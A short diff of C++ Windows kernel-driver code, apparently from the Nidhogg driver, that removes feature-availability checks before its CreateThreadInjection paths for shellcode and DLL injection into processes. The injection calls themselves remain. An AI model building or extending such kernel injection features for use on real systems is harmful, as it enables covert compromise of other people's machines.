@@ -894,12 +894,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 		case InjectionType::CreateThreadInjection: {
-			if (!Features.CreateThreadInjection) {
-				Print(DRIVER_PREFIX "Due to previous error, CreateThreadInjection shellcode injection feature is unavaliable.\n");
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-
 			status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
 			break;
 		}
@@ -960,12 +954,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 		case InjectionType::CreateThreadInjection: {
-			if (!Features.CreateThreadInjection) {
-				Print(DRIVER_PREFIX "Due to previous error, CreateThreadInjection dll injection feature is unavaliable.\n");
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-
 			status = NidhoggMemoryHandler->InjectDllThread(dllInfo);
 			break;
 		}
